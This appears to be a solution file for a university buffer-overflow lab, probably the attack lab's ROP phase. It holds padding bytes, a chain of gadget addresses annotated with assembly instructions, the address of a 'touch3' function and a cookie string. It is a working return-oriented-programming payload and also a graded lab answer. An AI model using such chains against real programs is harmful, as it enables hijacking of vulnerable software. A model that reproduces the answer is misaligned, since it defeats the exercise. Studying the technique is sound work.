31 32 33 34 35 36 37 38 
31 32 33 34 35 36 37 38 
31 32 33 34 35 36 37 38 
31 32 33 34 35 36 37 38 
31 32 33 34 35 36 37 38 
06 1a 40 00 00 00 00 00  movq %rsp, %rax
a2 19 40 00 00 00 00 00  movq %rax, %rdi
ab 19 40 00 00 00 00 00  popq %rax     
48 00 00 00 00 00 00 00  #offset
dd 19 40 00 00 00 00 00  movl %eax, %edx
34 1a 40 00 00 00 00 00  movl %edx, %ecx
27 1a 40 00 00 00 00 00  movl %ecx, %esi
d6 19 40 00 00 00 00 00  call add_xy
a2 19 40 00 00 00 00 00  movq %rax, %rdi
fa 18 40 00 00 00 00 00  #touch3 code address
35 39 62 39 39 37 66 61  # strings
00 00 00 00 00 00 00 00